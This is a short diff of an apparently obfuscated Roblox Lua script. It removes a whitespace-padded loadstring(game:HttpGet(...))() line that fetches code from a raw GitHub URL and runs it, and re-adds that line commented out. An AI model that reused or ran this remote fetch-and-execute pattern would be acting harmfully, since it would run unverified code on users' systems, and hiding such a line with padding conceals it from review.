@@ -5,98 +5,7 @@ Hibiscus Obfuscated !
 
 
 
-loadstring(game:HttpGet(("https://raw.githubusercontent.com/EscanoR-log/user-24612919-Escv-nor1289-.com/refs/heads/main/%3F.lua")))()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+-- loadstring(game:HttpGet(("https://raw.githubusercontent.com/EscanoR-log/user-24612919-Escv-nor1289-.com/refs/heads/main/%3F.lua")))()
 
 
 
@@ -107,6 +16,46 @@ loadstring(game:HttpGet(("https://raw.githubusercontent.com/EscanoR-log/user-246
 
 
 ]]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
